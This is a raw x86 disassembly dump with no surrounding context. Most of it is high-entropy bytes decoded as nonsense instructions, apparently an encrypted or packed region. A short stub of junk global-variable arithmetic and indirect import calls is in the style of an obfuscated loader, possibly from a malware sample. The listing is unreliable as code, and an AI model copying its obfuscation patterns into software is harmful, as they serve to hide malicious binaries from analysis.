  405640:	imul   esp,DWORD PTR [ecx+0x71],0xea23beb0
  405647:	lahf   
  405648:	rcl    BYTE PTR [ebp+0x20020ecd],0x58
  40564f:	mov    bh,dh
  405651:	or     dh,0x2b
  405654:	mov    eax,0x6430467c
  405659:	pushf  
  40565a:	or     ebx,DWORD PTR [edx+0x66]
  40565d:	ja     0x405622
  40565f:	ja     0x405649
  405661:	xor    al,0x98
  405663:	adc    ah,bh
  405665:	xchg   BYTE PTR [ebp-0x6db9babb],ah
  40566b:	mov    dl,0xca
  40566d:	mov    esi,0x35b215d9
  405672:	cld    
  405673:	adc    eax,0xf71a3199
  405678:	lds    ebp,FWORD PTR [edi-0x36]
  40567b:	imul   DWORD PTR [ecx+0x5651e65f]
  405681:	cmp    dl,BYTE PTR gs:[ebx]
  405684:	sub    ebx,DWORD PTR [esi+ebp*4]
  405687:	xchg   BYTE PTR [ecx],dl
  405689:	add    dl,BYTE PTR [edx-0x5c40dfd]
  40568f:	call   0xf9bbaaac
  405694:	fiadd  WORD PTR [ebx]
  405696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405697:	sbb    esi,edx
  405699:	and    BYTE PTR [ebp+esi*8+0x7d0cfb0],bl
  4056a0:	call   0xb456:0x6e66c39c
  4056a7:	add    BYTE PTR [eax-0x5a9c668f],ah
  4056ad:	adc    al,BYTE PTR [eax+0x6eca9337]
  4056b3:	pop    ss
  4056b4:	jg     0x4056d0
  4056b6:	mov    al,0xc1
  4056b8:	std    
  4056b9:	(bad)  
  4056ba:	xor    al,0x43
  4056bc:	add    eax,0xc6f4f00d
  4056c1:	inc    eax
  4056c2:	sub    al,0xeb
  4056c4:	mov    BYTE PTR [eax],cl
  4056c6:	xchg   BYTE PTR cs:[edx],al
  4056c9:	adc    ebx,DWORD PTR [eax+0x6e7fde0c]
  4056cf:	jb     0x405701
  4056d1:	xor    eax,0xb4a94ffd
  4056d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d7:	dec    eax
  4056d8:	mov    DWORD PTR [esi-0x39],esi
  4056db:	scas   eax,DWORD PTR es:[edi]
  4056dc:	fwait
  4056dd:	fs mov dl,0x79
  4056e0:	xchg   ebp,eax
  4056e1:	lea    esp,[ebx+ebp*4]
  4056e4:	mov    al,0x28
  4056e6:	xor    al,BYTE PTR [esi+eiz*2-0x6f]
  4056ea:	dec    eax
  4056eb:	out    0x37,al
  4056ed:	cmp    edx,DWORD PTR [edi-0x32a05f1f]
  4056f3:	mov    dh,0x38
  4056f5:	xchg   ebp,eax
  4056f6:	jns    0x405754
  4056f8:	pop    esi
  4056f9:	push   ds
  4056fa:	inc    edi
  4056fb:	sbb    DWORD PTR [ecx],eax
  4056fd:	xor    BYTE PTR [ebx+0x3d],0xd5
  405701:	cmp    DWORD PTR [ebp-0x31212fdb],ebx
  405707:	jns    0x40573f
  405709:	dec    edi
  40570a:	les    edx,FWORD PTR [ebx]
  40570c:	loopne 0x405781
  40570e:	sub    BYTE PTR [esi+edx*8+0x645f41f9],ah
  405715:	mov    ecx,0xa507136e
  40571a:	nop
  40571b:	xor    eax,0xeb02de58
  405720:	sbb    edx,DWORD PTR [eax+edi*4]
  405723:	jge    0x405703
  405725:	mov    esi,0x637d87b8
  40572a:	mov    eax,ds:0x3d875fb0
  40572f:	stos   DWORD PTR es:[edi],eax
  405730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405731:	jno    0x405738
  405733:	stos   BYTE PTR es:[edi],al
  405734:	pop    ss
  405735:	mov    cl,0x7d
  405738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405739:	lods   al,BYTE PTR ds:[esi]
  40573a:	out    dx,eax
  40573b:	adc    BYTE PTR [ecx+0x71],0x91
  40573f:	jne    0x405731
  405741:	push   0xffffffc5
  405743:	and    BYTE PTR [esi-0x7c8b],0x19
  40574a:	call   0x7368:0x4891e1b1
  405751:	push   ds
  405752:	cs xchg esi,eax
  405754:	mov    BYTE PTR ds:[edi+0x3b],dl
  405758:	mov    al,ds:0xda06ebab
  40575d:	iret   
  40575e:	xor    eax,0x12b346b5
  405763:	jg     0x405730
  405765:	add    DWORD PTR [esi-0x2d56a0f8],esi
  40576b:	mov    ds:0x67675d71,al
  405770:	pop    eax
  405771:	test   al,0xa
  405773:	adc    eax,0x85a95029
  405778:	add    ebp,edi
  40577a:	mov    esi,0x4cfeb110
  40577f:	add    DWORD PTR [edi+0x58],esi
  405782:	scas   al,BYTE PTR es:[edi]
  405783:	push   esi
  405784:	xchg   edx,eax
  405785:	int3   
  405786:	or     eax,0x5f2d9dc1
  40578b:	sbb    esi,DWORD PTR [ecx-0x69]
  40578e:	enter  0x9fe9,0x31
  405792:	xchg   ecx,eax
  405793:	xchg   edi,eax
  405794:	mov    dh,0x98
  405796:	cmp    eax,ebp
  405798:	mov    eax,ds:0x46b90c8e
  40579d:	data16 aaa 
  40579f:	add    esp,DWORD PTR ds:0xe49c7506
  4057a5:	repz stc 
  4057a7:	shl    dl,1
  4057a9:	adc    DWORD PTR [edx],ebp
  4057ab:	clc    
  4057ac:	je     0x405748
  4057ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057af:	and    edx,DWORD PTR [eax+0x29]
  4057b2:	(bad)  
  4057b3:	repnz rcl BYTE PTR [edi+0x13],1
  4057b7:	ret    
  4057b8:	mov    ebx,0x7d6bf6dd
  4057bd:	into   
  4057be:	ficom  DWORD PTR es:[eax+0x41]
  4057c2:	into   
  4057c3:	bound  edi,QWORD PTR [ecx-0x18]
  4057c6:	pop    eax
  4057c7:	in     eax,dx
  4057c8:	xchg   edx,eax
  4057c9:	test   al,0x8f
  4057cb:	std    
  4057cc:	jle    0x40581f
  4057ce:	and    al,0x50
  4057d0:	repz dec edi
  4057d2:	inc    ecx
  4057d3:	pop    esp
  4057d4:	jp     0x40581b
  4057d6:	adc    esi,esi
  4057d8:	cmp    BYTE PTR [esi],al
  4057da:	adc    al,0x9e
  4057dc:	push   esp
  4057dd:	add    dl,bh
  4057df:	xchg   ebp,eax
  4057e0:	clc    
  4057e1:	imul   edi,DWORD PTR [ebx+0x4d4cace6],0x359a6d6b
  4057eb:	in     al,0x33
  4057ed:	ficom  DWORD PTR ds:0x40ecb1b6
  4057f3:	ret    0x4a46
  4057f6:	std    
  4057f7:	mov    esi,0x71b2ad57
  4057fc:	pusha  
  4057fd:	icebp  
  4057fe:	in     eax,dx
  4057ff:	(bad)  
  405800:	je     0x405821
  405802:	xchg   ecx,eax
  405803:	test   BYTE PTR [edi+0x7b6ad9bc],al
  405809:	xlat   BYTE PTR ds:[ebx]
  40580a:	retf   0x96c3
  40580d:	mov    esp,0x1c5956a
  405812:	(bad)
  405815:	lods   al,BYTE PTR ds:[esi]
  405816:	cmp    DWORD PTR [esi],edx
  405818:	dec    esi
  405819:	(bad)  
  40581a:	ins    DWORD PTR es:[edi],dx
  40581b:	test   eax,0xefbb7a1d
  405820:	aaa    
  405821:	inc    ecx
  405822:	jne    0x4057be
  405824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405825:	inc    ebx
  405826:	xchg   DWORD PTR [edx+0x6a63018b],edi
  40582c:	aas    
  40582d:	xor    eax,0xde1f062
  405832:	push   ebx
  405833:	iret   
  405834:	aaa    
  405835:	xchg   edx,eax
  405836:	jle    0x405895
  405838:	not    DWORD PTR [eax]
  40583a:	add    cl,BYTE PTR [esi-0x52]
  40583d:	xchg   BYTE PTR [edi+0x12c90b12],ch
  405843:	add    BYTE PTR [esi],al
  405845:	jmp    0xe363:0xf1c2fd2c
  40584c:	inc    edi
  40584d:	lds    esi,FWORD PTR [edi+0x1]
  405850:	jp     0x4057f7
  405852:	or     DWORD PTR [esi-0x6e],esi
  405855:	dec    ecx
  405856:	adc    DWORD PTR [edi],edx
  405858:	aad    0x98
  40585a:	dec    eax
  40585b:	add    al,0xf0
  40585d:	jb     0x4058ca
  40585f:	and    bh,cl
  405861:	push   ss
  405862:	mov    ds:0x41d1ae92,al
  405867:	or     BYTE PTR [edx-0x7d28b91c],bl
  40586d:	inc    esp
  40586e:	pop    DWORD PTR [eax-0x726ac82a]
  405874:	add    DWORD PTR [edx],ebp
  405876:	std    
  405877:	sub    eax,0x9fc5bebe
  40587c:	mov    eax,ds:0x912d4622
  405881:	cmc    
  405882:	mov    edx,esi
  405884:	lds    esi,FWORD PTR ds:0xec3addcc
  40588a:	dec    edx
  40588b:	xchg   DWORD PTR [eax+eiz*4+0x79],esi
  40588f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405890:	inc    ebp
  405891:	cmp    ecx,DWORD PTR [esi]
  405893:	sub    cl,BYTE PTR [ecx]
  405895:	fdivrp st(2),st
  405897:	adc    dl,BYTE PTR [eax+ecx*4-0x871619a]
  40589e:	mov    edi,0x6b8a99ac
  4058a3:	lods   eax,DWORD PTR ds:[esi]
  4058a4:	inc    edi
  4058a5:	xchg   ebx,eax
  4058a6:	mov    ds:0xdc482b55,eax
  4058ab:	push   ss
  4058ac:	fild   DWORD PTR [eax+edi*1+0x9]
  4058b0:	gs and eax,0xeff9a0b4
  4058b6:	mov    BYTE PTR [ebx-0x29],al
  4058b9:	xchg   al,ch
  4058bb:	lds    edi,FWORD PTR [eax+0x4a]
  4058be:	je     0x40589a
  4058c0:	jge    0x4058ac
  4058c2:	jecxz  0x405932
  4058c4:	inc    ebx
  4058c5:	or     ebp,DWORD PTR [ecx-0x126dbb0c]
  4058cb:	xchg   edi,eax
  4058cc:	xchg   BYTE PTR [eax],ch
  4058ce:	push   ds
  4058cf:	lock div BYTE PTR [eax+edx*2-0x2f833d46]
  4058d7:	outs   dx,BYTE PTR ds:[esi]
  4058d8:	mov    es,WORD PTR [edx]
  4058da:	pop    eax
  4058db:	call   0x5fc3402b
  4058e0:	fs repz dec ebp
  4058e3:	loope  0x40588a
  4058e5:	mov    ds:0xfc2b59d2,al
  4058ea:	adc    eax,0x1280879c
  4058ef:	jae    0x40596c
  4058f1:	retf   0x42c1
  4058f4:	dec    ebx
  4058f5:	in     eax,0x4
  4058f7:	jl     0x405903
  4058f9:	jae    0x4058b4
  4058fb:	jmp    0x80d56939
  405900:	shr    DWORD PTR [edi],0x4f
  405903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405904:	jae    0x4058ed
  405906:	xchg   ebx,eax
  405907:	jne    0x40592b
  405909:	ficom  WORD PTR [ebx+0x3e3e8400]
  40590f:	jb     0x405985
  405911:	imul   esi,DWORD PTR [ebp+0x36],0xffffffe2
  405915:	out    dx,al
  405916:	add    eax,0x100c9088
  40591b:	setle  BYTE PTR [esi-0x64]
  40591f:	rcl    ebx,1
  405921:	mov    bl,0x9e
  405923:	or     al,al
  405925:	(bad)  
  405927:	add    DWORD PTR [ebx-0x5d],ebx
  40592a:	or     edi,ebx
  40592c:	(bad)  
  40592d:	jp     0x405941
  40592f:	and    eax,0x9dc5a811
  405934:	mov    dl,0x6f
  405936:	or     DWORD PTR [ecx+0x15],ebp
  405939:	mov    ch,0x76
  40593b:	stos   DWORD PTR es:[edi],eax
  40593c:	or     DWORD PTR [edi-0x609042ff],esi
  405942:	mov    al,0xe7
  405944:	dec    eax
  405945:	call   0x91dc:0x94db106f
  40594c:	sbb    al,BYTE PTR [edx-0x6b]
  40594f:	mov    edx,0x3a5f4623
  405954:	stos   BYTE PTR es:[edi],al
  405955:	cwde   
  405956:	(bad)  
  405957:	out    dx,al
  405958:	gs push ebp
  40595a:	(bad)  
  40595b:	sbb    BYTE PTR [ebp+0x42],al
  40595e:	jns    0x405951
  405960:	add    eax,DWORD PTR [ebx+0x55]
  405963:	jb     0x4059bf
  405965:	mov    dh,0x92
  405967:	jns    0x4059d6
  405969:	out    0x77,eax
  40596b:	in     eax,dx
  40596c:	and    eax,ebx
  40596e:	xor    BYTE PTR ds:0x58264a90,0x1
  405975:	outs   dx,BYTE PTR ds:[esi]
  405976:	pushf  
  405977:	clc    
  405978:	sbb    ebx,edx
  40597a:	jmp    0x4059dd
  40597c:	data16 cmp cl,bh
  40597f:	in     eax,0x63
  405981:	fmulp  st(5),st
  405983:	popf   
  405984:	mov    dl,0x2f
  405986:	shl    BYTE PTR [eax+0xa],cl
  405989:	test   al,0x1
  40598b:	dec    esp
  40598c:	push   ecx
  40598d:	or     esi,0xf245f870
  405993:	and    esp,DWORD PTR [esi-0x4a]
  405996:	cli    
  405997:	fs cli 
  405999:	aad    0x3
  40599b:	jns    0x4059b1
  40599d:	test   esi,ecx
  40599f:	push   edx
  4059a0:	sub    DWORD PTR [edi+0x5ef5f3b1],esp
  4059a6:	int3   
  4059a7:	push   edi
  4059a8:	push   esi
  4059a9:	js     0x40595b
  4059ab:	sbb    al,0x9c
  4059ad:	fist   DWORD PTR [eax-0x33e19178]
  4059b3:	and    al,0x3
  4059b5:	(bad)  
  4059b6:	fcom   QWORD PTR [ecx+0x1]
  4059b9:	sbb    DWORD PTR [esi+0x3a],eax
  4059bc:	sbb    dl,bh
  4059be:	les    ecx,FWORD PTR [edx]
  4059c0:	es stos DWORD PTR es:[edi],eax
  4059c2:	pop    ss
  4059c3:	pop    ss
  4059c4:	and    esi,DWORD PTR [edx]
  4059c6:	jmp    0x54d8:0xdf808883
  4059cd:	pop    esi
  4059ce:	jmp    0x37cd:0x51ec2d33
  4059d5:	(bad)  
  4059d6:	sub    bh,dh
  4059d8:	scas   al,BYTE PTR es:[edi]
  4059d9:	sub    cl,BYTE PTR ds:0xfe77e36e
  4059df:	jl     0x405a5f
  4059e1:	sbb    edx,eax
  4059e3:	(bad)  
  4059e4:	mov    WORD PTR [edi+0x50],es
  4059e7:	mov    al,ds:0x6792e761
  4059ec:	inc    eax
  4059ed:	aad    0x18
  4059ef:	retf   0x8c0
  4059f2:	int    0x80
  4059f4:	out    0xde,eax
  4059f6:	hlt    
  4059f7:	lea    edi,[ecx+0x6]
  4059fa:	mov    eax,ds:0xda9d3cc5
  4059ff:	cmp    al,0xf8
  405a01:	gs mov eax,0x7eaba413
  405a07:	les    ecx,FWORD PTR [ebp+0x3d928d3d]
  405a0d:	jp     0x405a3e
  405a0f:	mov    eax,0x44c91d7e
  405a14:	cwde   
  405a15:	cmp    eax,0x7441533
  405a1a:	sub    bh,dl
  405a1c:	in     al,dx
  405a1d:	jp     0x405a80
  405a1f:	pop    esp
  405a20:	in     al,0x7f
  405a22:	dec    eax
  405a23:	dec    ecx
  405a24:	aam    0xc4
  405a26:	add    DWORD PTR [ebp+0x36ae749f],edx
  405a2c:	and    edi,DWORD PTR [eax-0x4fae1788]
  405a32:	out    dx,al
  405a33:	ss or  al,0x97
  405a36:	jp     0x405a0b
  405a38:	aam    0xaf
  405a3a:	mov    WORD PTR [ebp+0x5495b165],es
  405a40:	mov    esi,0x1d2c1de5
  405a45:	add    DWORD PTR ds:0xaf28e97d,edi
  405a4b:	popf   
  405a4c:	js     0x4059e1
  405a4e:	mov    ds:0x5ef5d087,al
  405a53:	dec    ebx
  405a54:	daa    
  405a55:	scas   al,BYTE PTR es:[edi]
  405a56:	ret    
  405a57:	(bad)  
  405a58:	cwde   
  405a59:	push   eax
  405a5a:	dec    edi
  405a5b:	push   es
  405a5c:	mov    dh,0x87
  405a5e:	repz inc eax
  405a60:	jmp    0x405ad8
  405a62:	mov    ds:0x8ec2b3,eax
  405a67:	push   eax
  405a68:	loope  0x405a35
  405a6a:	fnstenv [bx]
  405a6d:	pop    edx
  405a6e:	and    DWORD PTR [esi+esi*2-0x6ea8d6b3],esi
  405a75:	pop    ecx
  405a76:	xchg   ebp,eax
  405a77:	sub    dh,BYTE PTR [ebx]
  405a79:	call   0x5b3b:0x2ed6d1de
  405a80:	gs dec esp
  405a82:	sub    DWORD PTR [edx-0x74],ebp
  405a85:	les    esp,FWORD PTR [eax+0x7635f3c0]
  405a8b:	push   cs
  405a8c:	aam    0xd0
  405a8e:	sbb    DWORD PTR [edi-0x2],0xb
  405a92:	les    ebp,FWORD PTR [edx+0x21]
  405a95:	mov    eax,0xaffddb7c
  405a9a:	push   edx
  405a9b:	(bad)  
  405a9c:	or     eax,0xb1ddcbf4
  405aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa2:	popa   
  405aa3:	outs   dx,BYTE PTR ds:[esi]
  405aa4:	sbb    al,0xf3
  405aa6:	rol    DWORD PTR [ebx+edi*2+0x4d],0xe2
  405aab:	hlt    
  405aac:	sub    DWORD PTR [edi],edi
  405aae:	fsub   st,st(6)
  405ab0:	add    al,0x1f
  405ab2:	jmp    0x405aba
  405ab4:	adc    BYTE PTR [edi],0x3a
  405ab7:	and    ecx,edx
  405ab9:	stos   BYTE PTR es:[edi],al
  405aba:	jmp    0xfa8cb59
  405abf:	std    
  405ac0:	stc    
  405ac1:	ret    
  405ac2:	sbb    al,0xa8
  405ac4:	sti    
  405ac5:	adc    edx,DWORD PTR [eax]
  405ac7:	push   esp
  405ac8:	stos   BYTE PTR es:[edi],al
  405ac9:	loop   0x405a56
  405acb:	cmp    BYTE PTR [ebx+ecx*4+0x44cd19c5],0x53
  405ad3:	cld    
  405ad4:	inc    edx
  405ad5:	push   0xffffff99
  405ad7:	hlt    
  405ad8:	xor    ebp,DWORD PTR [ebx-0x47]
  405adb:	pop    edx
  405adc:	out    0xe6,eax
  405ade:	jmp    FWORD PTR [ebx+0x76]
  405ae1:	xchg   ebx,eax
  405ae2:	mov    WORD PTR [ecx],ss
  405ae4:	dec    ebp
  405ae5:	dec    esp
  405ae6:	test   ebp,0xa49adfaa
  405aec:	jmp    ecx
  405aee:	imul   edi,DWORD PTR [ebx-0x726b0a1],0x13
  405af5:	mul    DWORD PTR [eax+edx*1-0x63343f44]
  405afc:	js     0x405b25
  405afe:	dec    ecx
  405aff:	add    BYTE PTR [eax],al
  405b01:	sub    eax,0x63691bd6
  405b06:	pop    edi
  405b07:	dec    ebx
  405b08:	test   DWORD PTR [eax-0x2c],esi
  405b0b:	push   es
  405b0c:	jmp    0x7887:0x20cd773c
  405b13:	cmp    BYTE PTR [esi+0x8625ee0],dl
  405b19:	xchg   ecx,edx
  405b1b:	jle    0x405b01
  405b1d:	in     al,dx
  405b1e:	(bad)  
  405b1f:	jb     0x405b36
  405b21:	cmp    eax,0x22c5a41c
  405b26:	push   ebp
  405b27:	add    eax,0x82abca9b
  405b2c:	pop    ebx
  405b2d:	dec    ebp
  405b2e:	(bad)  [edi-0x44234886]
  405b34:	xchg   esp,eax
  405b35:	je     0x405b35
  405b37:	bound  eax,QWORD PTR [edx+0x42ff5cb8]
  405b3d:	fisttp DWORD PTR [ebp-0x5b]
  405b40:	xor    DWORD PTR [ebp-0x4228b9e4],esp
  405b46:	push   eax
  405b47:	and    DWORD PTR [eax-0x1eb6dd72],edx
  405b4d:	push   es
  405b4e:	xchg   ecx,eax
  405b4f:	and    al,0x8b
  405b51:	cmp    BYTE PTR [ebx+0x28f5f42e],bl
  405b57:	jp     0x405b43
  405b59:	aas    
  405b5a:	test   al,0xad
  405b5c:	push   edi
  405b5d:	aad    0x46
  405b5f:	mov    esi,0x7241cd56
  405b64:	inc    edx
  405b65:	out    0x9e,al
  405b67:	or     eax,0xb9cfa6e2
  405b6c:	adc    eax,ecx
  405b6e:	push   edi
  405b6f:	cmp    bh,ch
  405b71:	sub    edi,edi
  405b73:	fistp  WORD PTR [esi]
  405b75:	bound  edx,QWORD PTR [ecx-0x61]
  405b78:	pop    es
  405b79:	nop
  405b7a:	cmp    eax,DWORD PTR [ecx-0xbebff08]
  405b80:	or     edx,DWORD PTR ds:0x9678b182
  405b86:	push   0xe01099ec
  405b8b:	loope  0x405b4c
  405b8d:	scas   al,BYTE PTR es:[edi]
  405b8e:	jno    0x405bd2
  405b90:	outs   dx,DWORD PTR ds:[esi]
  405b91:	inc    edx
  405b92:	add    bh,BYTE PTR [edx]
  405b94:	sbb    BYTE PTR [edx+0x607cc5ef],0xef
  405b9b:	jp     0x405b50
  405b9d:	jo     0x405b9a
  405b9f:	addps  xmm4,XMMWORD PTR [ebx-0x42]
  405ba3:	daa    
  405ba4:	cli    
  405ba5:	mov    DWORD PTR [edi-0x644f8b08],esi
  405bab:	out    dx,eax
  405bac:	sub    DWORD PTR [eax-0xb10f296],edx
  405bb2:	mov    ch,0xca
  405bb4:	mov    eax,ds:0x11077e0e
  405bb9:	and    eax,0x6776216a
  405bbe:	scas   al,BYTE PTR es:[edi]
  405bbf:	jae    0x405b86
  405bc1:	loope  0x405bdc
  405bc3:	out    0xd,al
  405bc5:	(bad)  
  405bc6:	adc    al,0x41
  405bc8:	add    DWORD PTR [ecx+0x6ea67923],ebp
  405bce:	xchg   ch,cl
  405bd0:	mov    edi,0xbe81a578
  405bd5:	mov    esi,0x509fa5be
  405bda:	cli    
  405bdb:	test   BYTE PTR [eax],dl
  405bdd:	les    ecx,FWORD PTR [ecx]
  405bdf:	cs pop esi
  405be1:	xchg   edx,eax
  405be2:	sub    al,0x5f
  405be4:	out    dx,eax
  405be5:	push   ss
  405be6:	imul   ebp,DWORD PTR [ebx+0x5489bfa7],0xffffffc5
  405bed:	and    al,BYTE PTR [ecx+0x5]
  405bf0:	(bad)  
  405bf1:	mov    al,ds:0xe0536ddf
  405bf6:	pop    es
  405bf7:	fdiv   st,st(4)
  405bf9:	jl     0x405c16
  405bfb:	repnz icebp 
  405bfd:	call   ecx
  405bff:	xchg   ebp,eax
  405c00:	sub    DWORD PTR [eax],0x8cd71a91
  405c06:	into   
  405c07:	and    DWORD PTR [esi],ecx
  405c09:	jns    0x405c39
  405c0b:	sub    bl,dh
  405c0d:	imul   ecx,DWORD PTR [edx+edx*4-0x7cc231e2],0x75d3ec8d
  405c18:	jnp    0x405c17
  405c1a:	jmp    0xac91:0x5d5357c3
  405c21:	ds retf 0x27ff
  405c25:	dec    edx
  405c26:	lods   al,BYTE PTR ds:[esi]
  405c27:	or     ch,0xb0
  405c2a:	out    0x5,eax
  405c2c:	test   al,0x87
  405c2e:	push   ecx
  405c2f:	out    0x4e,al
  405c31:	ds neg edi
  405c34:	adc    edi,edi
  405c36:	mov    ah,0x44
  405c38:	pop    es
  405c39:	lods   eax,DWORD PTR ds:[esi]
  405c3a:	lea    edi,[ebx+0x31]
  405c3d:	xor    DWORD PTR ds:0xda4a1a1c,ecx
  405c43:	cdq    
  405c44:	xchg   esi,eax
  405c45:	jmp    FWORD PTR [ecx-0x7d]
  405c48:	test   ch,dh
  405c4a:	out    dx,al
  405c4b:	jmp    0xd069:0x20ac42e5
  405c52:	and    ah,BYTE PTR [ebx+0x6c6a101c]
  405c58:	jne    0x405cd0
  405c5a:	fs mov cl,0xdc
  405c5d:	jl     0x405c5f
  405c5f:	popf   
  405c60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c61:	retf   
  405c62:	lahf   
  405c63:	sub    edi,ecx
  405c65:	rcr    DWORD PTR [ebx+ecx*1+0x5fc107d0],0x5e
  405c6d:	leave  
  405c6e:	ret    
  405c6f:	push   ebp
  405c70:	mov    ebp,esp
  405c72:	sub    esp,0x58
  405c75:	add    DWORD PTR ds:0x429008,0x42b004
  405c7f:	push   ebx
  405c80:	adc    DWORD PTR ds:0x42a018,0x429010
  405c8a:	push   esi
  405c8b:	push   edi
  405c8c:	and    DWORD PTR ds:0x42c00c,0x6433
  405c96:	push   0x1f
  405c98:	lea    eax,[ebp-0x58]
  405c9b:	push   eax
  405c9c:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405ca6:	push   0x0
  405ca8:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405cb2:	call   DWORD PTR ds:0x424034
  405cb8:	call   DWORD PTR ds:0x424004
  405cbe:	and    DWORD PTR ds:0x42a000,0x4473
  405cc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ccf:	and    DWORD PTR ds:0x429018,0x0
  405cd9:	mov    ebx,DWORD PTR ds:0x429018
  405cdf:	inc    ebx
  405ce0:	mov    DWORD PTR ds:0x429018,ebx
  405ce6:	cmp    DWORD PTR ds:0x429018,0x1f
  405ced:	jne    0x405d03
  405cf3:	push   0x42b00c
  405cf8:	push   0x7f05
  405cfd:	call   DWORD PTR ds:0x42403c
  405d03:	cmp    DWORD PTR ds:0x429018,0x19
  405d0a:	jb     0x405cd9
  405d10:	add    ebx,DWORD PTR ds:0x42a008
  405d16:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d1d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d20:	mov    ebx,0x7510893
  405d25:	xor    ecx,ebx
  405d27:	or     DWORD PTR ds:0x42b00c,edx
  405d2d:	mov    eax,0x3272db
  405d32:	add    ecx,eax
  405d34:	sub    DWORD PTR ds:0x42a010,0x429004
  405d3e:	mov    DWORD PTR [ebp-0x1c],ecx
  405d41:	mov    ecx,DWORD PTR [ebp+0x14]
  405d44:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d4e:	test   ecx,ecx
  405d50:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d5a:	je     0x405d78
  405d60:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d6a:	mov    ecx,DWORD PTR [ebp+0x14]
  405d6d:	mov    ecx,DWORD PTR [ecx]
  405d6f:	add    DWORD PTR ds:0x42a000,ecx
  405d75:	mov    DWORD PTR [ebp-0x1c],ecx
  405d78:	and    DWORD PTR ds:0x42a010,0x0
  405d82:	mov    edi,DWORD PTR ds:0x42a010
  405d88:	inc    edi
  405d89:	mov    DWORD PTR ds:0x42a010,edi
  405d8f:	cmp    DWORD PTR ds:0x42a010,0x9
  405d96:	jne    0x405daa
  405d9c:	push   DWORD PTR [ebp-0x14]
  405d9f:	push   0x423573
  405da4:	call   DWORD PTR ds:0x424040
  405daa:	cmp    DWORD PTR ds:0x42a010,0x8
  405db1:	jne    0x405dc4
  405db7:	mov    edi,DWORD PTR ds:0x42a010
  405dbd:	inc    edi
  405dbe:	mov    DWORD PTR ds:0x42a010,edi
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x13
  405dcb:	jb     0x405d82
  405dd1:	mov    ecx,0x457a
  405dd6:	imul   edx,eax
  405dd9:	mov    esi,0x787f
  405dde:	or     DWORD PTR ds:0x428004,0x4238
  405de8:	add    edx,ecx
  405dea:	sbb    DWORD PTR ds:0x429014,0x4641
  405df4:	jmp    0x40819c
  405df9:	jecxz  0x405d80
  405dfb:	cmp    eax,0x636a9b92
  405e00:	sbb    esp,0xffffffb2
  405e03:	fild   WORD PTR [ecx+0x44a11115]
  405e09:	push   edx
  405e0a:	cmp    esp,DWORD PTR [edx+0x62]
  405e0d:	neg    DWORD PTR [edi+0x62]
  405e10:	bound  edi,QWORD PTR [ecx]
  405e12:	push   ebp
  405e13:	gs cdq 
  405e15:	mov    ah,0x9c
  405e17:	push   ebp
  405e18:	into   
  405e19:	jecxz  0x405e7f
  405e1b:	pop    ebp
  405e1c:	sbb    bh,BYTE PTR [esi+edi*2+0x1979409e]
  405e23:	xor    DWORD PTR [edi-0x35],ebx
  405e26:	das    
  405e27:	sar    DWORD PTR [ebp-0x71768634],0x9b
  405e2e:	mov    edx,0xef8a4556
  405e33:	add    eax,0xcedf5d5c
  405e38:	ret    0xd5a3
  405e3b:	imul   ebx,DWORD PTR ds:0x6cc29365,0xffffffea
  405e42:	rcl    DWORD PTR [eax+0x3c],cl
  405e45:	xchg   ah,dh
  405e47:	sbb    ah,BYTE PTR [edx]
  405e49:	pop    ebx
  405e4a:	out    0xe,eax
  405e4c:	xchg   DWORD PTR [edi],esp
  405e4e:	std    
  405e4f:	test   BYTE PTR [edi-0x233db009],bh
  405e55:	hlt    
  405e56:	and    eax,0x1ddb5f07
  405e5b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  405e5d:	icebp  
  405e5e:	ss and eax,0x1b1fc845
  405e64:	push   edx
  405e65:	aas    
  405e66:	adc    eax,0xc2434e5e
  405e6b:	sub    al,0x14
  405e6d:	xor    DWORD PTR [edi+0x60b1e403],esi
  405e73:	jbe    0x405ee7
  405e75:	mov    al,ds:0x4f041f4
  405e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e7b:	jb     0x405eab
  405e7d:	dec    edi
  405e7e:	pop    edi
  405e7f:	push   es
  405e80:	mov    ebp,0x6eb5a9db
  405e85:	imul   ebx,DWORD PTR [esi],0x22
  405e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e89:	mov    dl,0x8
  405e8b:	pop    ds
  405e8c:	mov    ss,WORD PTR [eax+0x39]
  405e8f:	clc    
  405e90:	ins    DWORD PTR es:[edi],dx
  405e91:	and    al,0x1e
  405e93:	fsubr  DWORD PTR [esi-0x74]
  405e96:	call   0xf722177d
  405e9b:	mov    BYTE PTR [ebp+0x6299408e],0x7b
  405ea2:	or     DWORD PTR [ebx+0x63b75265],esp
  405ea8:	fnstcw WORD PTR [ebx]
  405eaa:	iret   
  405eab:	mov    eax,ds:0x2ebd4976
  405eb0:	jbe    0x405e70
  405eb2:	and    BYTE PTR ds:0x72403686,ch
  405eb8:	dec    esp
  405eb9:	js     0x405f01
  405ebb:	and    BYTE PTR [ebp-0x29],dh
  405ebe:	ds popa 
  405ec0:	or     ch,BYTE PTR [eax]
  405ec2:	xchg   ecx,eax
  405ec3:	xor    BYTE PTR [ebx+ecx*8],0x6
  405ec7:	rol    BYTE PTR [edi],1
  405ec9:	xor    ah,BYTE PTR [ecx]
  405ecb:	inc    ebx
  405ecc:	xor    eax,0x969562aa
  405ed1:	mov    bl,0x2b
  405ed3:	loop   0x405e8a
  405ed5:	fst    QWORD PTR [ebp+edi*4-0x53]
  405ed9:	int3   
  405eda:	xchg   ecx,eax
